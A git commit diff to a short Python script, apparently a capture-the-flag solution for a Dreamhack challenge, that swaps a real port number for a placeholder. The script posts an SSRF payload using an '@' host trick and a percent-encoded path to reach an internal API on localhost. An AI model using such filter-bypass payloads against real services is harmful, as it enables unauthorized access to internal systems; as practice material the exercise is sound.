2c176c51b2960c3b1008758f3a8340960c407363
JH0814 <40225003+JH0814@users.noreply.github.com>
2025-02-23 10:58:59 +0900

    Update curling.py

--- curling/curling.py
+++ curling/curling.py
@@ -1,6 +1,6 @@
 import requests
 
-url = "http://host1.dreamhack.games:9407"
+url = "http://host1.dreamhack.games:PORT"
 fir_url = url + "/api/v1/test/curl"
 data = {'url':'http://dreamhack.io@localhost:8000/api/v1/test/interna%6c'}
 res = requests.post(fir_url, data=data)
